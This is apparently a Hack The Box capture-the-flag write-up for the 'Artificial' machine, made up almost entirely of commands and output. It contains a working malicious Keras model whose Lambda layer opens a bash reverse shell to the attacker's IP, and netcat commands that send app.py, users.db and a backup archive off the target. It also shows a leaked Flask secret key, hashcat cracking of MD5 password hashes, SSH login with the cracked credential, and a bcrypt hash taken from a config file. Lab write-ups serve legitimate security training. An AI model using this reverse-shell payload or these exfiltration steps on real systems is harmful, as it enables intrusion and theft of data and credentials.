## artificial.htb

#### https://app.hackthebox.com/machines/Artificial

#### ---USER FLAG---

**Dockerfile**
```
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

**requirements.txt**
```
tensorflow-cpu==2.13.1

```

```py
import tensorflow as tf

def reverse_shell(x):
    import os
    os.system('bash -c "bash -i >& /dev/tcp/10.10.16.55/1717 0>&1"')
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(reverse_shell))
model.compile()
model.save("reverse_shell.h5")
```

```
Hexada@hexada ~/Downloads$ nc -lnvp 1717                                                                                         
```

![image](https://github.com/user-attachments/assets/04baf05d-89aa-4ad0-9407-32cd71edabe8)

```
Hexada@hexada ~/pentest-env/vrm/artificial.htb$ nc -lnvp 1717                                                               1 ↵  
Connection from 10.10.11.74:34848
bash: cannot set terminal process group (873): Inappropriate ioctl for device
bash: no job control in this shell
app@artificial:~/app$ ls
app.py
instance
models
__pycache__
static
templates
```

```
Hexada@hexada ~/pentest-env/vrm/artificial.htb$ nc -lnvp 1717 > app.py

app@artificial:~/app$ nc 10.10.16.55 1818 < app.py
```

```py
from flask import Flask, render_template, request, redirect, url_for, session, send_file, flash
from flask_sqlalchemy import SQLAlchemy
from werkzeug.utils import secure_filename
import os
import tensorflow as tf
import hashlib
import uuid
import numpy as np
import io
from contextlib import redirect_stdout
import hashlib

app = Flask(__name__)
app.secret_key = "Sup3rS3cr3tKey4rtIfici4L"

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'models'

db = SQLAlchemy(app)

MODEL_FOLDER = 'models'
os.makedirs(MODEL_FOLDER, exist_ok=True)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password = db.Column(db.String(200), nullable=False)
    models = db.relationship('Model', backref='owner', lazy=True)

class Model(db.Model):
    id = db.Column(db.String(36), primary_key=True)
    filename = db.Column(db.String(120), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() == 'h5'

def hash(password):
 password = password.encode()
 hash = hashlib.md5(password).hexdigest()
 return hash
```

```
app@artificial:~/app/instance$ ls
ls
users.db
```

```
hash = hashlib.md5(password).hexdigest()
```

```
Hexada@hexada ~/pentest-env/vrm/artificial.htb$ nc -lnvp 1717 > users.db

app@artificial:~/app$ nc 10.10.16.55 1818 < users.db
```

![image](https://github.com/user-attachments/assets/6a931375-3655-4714-9e26-bbae3db8b397)

```
app@artificial:~/app$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
gael:x:1000:1000:gael:/home/gael:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:997:997::/var/log/laurel:/bin/false
```

```
Hexada@hexada ~/pentest-env/vrm/artificial.htb$ cat hash.txt                                                                1 ↵  
c99175974b6e192936d97224638a34f8
05c043f7120f53af8271be95598ac44e
```

```
Hexada@hexada ~/pentest-env/vrm/artificial.htb$ hashcat -m 0 -a 0 hash.txt /home/Hexada/pentest-env/pentesting-wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt -o password.txt
hashcat (v6.2.6) starting

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

INFO: Removed hash found as potfile entry.

Host memory required for this attack: 1027 MB

Dictionary cache hit:
* Filename..: /home/Hexada/pentest-env/pentesting-wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384
```

```
Hexada@hexada ~/pentest-env/vrm/artificial.htb$ cat passwords.txt                                                                
c99175974b6e192936d97224638a34f8:mattp005num*****
```

```
Hexada@hexada ~/pentest-env/vrm/artificial.htb$ ssh gael@artificial.htb                                                          

gael@artificial.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 28 Jun 2025 08:43:23 PM UTC

  System load:           0.03
  Usage of /:            72.5% of 7.53GB
  Memory usage:          39%
  Swap usage:            0%
  Processes:             272
  Users logged in:       2
  IPv4 address for eth0: 10.10.11.74
  IPv6 address for eth0: dead:beef::250:56ff:fe94:7c4


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jun 28 20:43:24 2025 from 10.10.16.55
gael@artificial:~$ ls
user.txt
gael@artificial:~$ cat user.txt
093dcc6786be90ee488*****
gael@artificial:~$ 
```

#### ---ROOT FLAG---

```
gael@artificial:~$ ss -tulnp
Netid            State             Recv-Q            Send-Q                         Local Address:Port                         Peer Address:Port            Process            
udp              UNCONN            0                 0                              127.0.0.53%lo:53                                0.0.0.0:*                                  
tcp              LISTEN            0                 2048                               127.0.0.1:5000                              0.0.0.0:*                                  
tcp              LISTEN            0                 4096                               127.0.0.1:9898                              0.0.0.0:*                                  
tcp              LISTEN            0                 511                                  0.0.0.0:80                                0.0.0.0:*                                  
tcp              LISTEN            0                 4096                           127.0.0.53%lo:53                                0.0.0.0:*                                  
tcp              LISTEN            0                 128                                  0.0.0.0:22                                0.0.0.0:*                                  
tcp              LISTEN            0                 511                                     [::]:80                                   [::]:*                                  
tcp              LISTEN            0                 128                                     [::]:22                                   [::]:*
```

```
ssh -L 9898:localhost:9898 gael@artificial.htb
```

![image](https://github.com/user-attachments/assets/cbc264c3-ef53-45c0-bb5f-d665c4f0486f)

```
gael@artificial:/var/backups$ ls
alternatives.tar.0     apt.extended_states.1.gz  apt.extended_states.3.gz  apt.extended_states.5.gz  backrest_backup.tar.gz  dpkg.statoverride.0
apt.extended_states.0  apt.extended_states.2.gz  apt.extended_states.4.gz  apt.extended_states.6.gz  dpkg.diversions.0       dpkg.status.0
```

```
Hexada@hexada ~/pentest-env/vrm/artificial.htb$ nc -lnvp 1818 > backrest_backup.tar.gz

gael@artificial:/var/backups$ nc 10.10.16.105 1818 < backrest_backup.tar.gz
```

```
Hexada@hexada ~/pentest-env/vrm/artificial.htb/backrest$ ls -a                                                                                                                
.  ..  backrest  .config  install.sh  jwt-secret  oplog.sqlite  oplog.sqlite.lock  processlogs  restic  tasklogs
```

```
Hexada@hexada ~/pentest-env/vrm/artificial.htb/backrest/.config/backrest$ cat config.json                                                                                     
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```
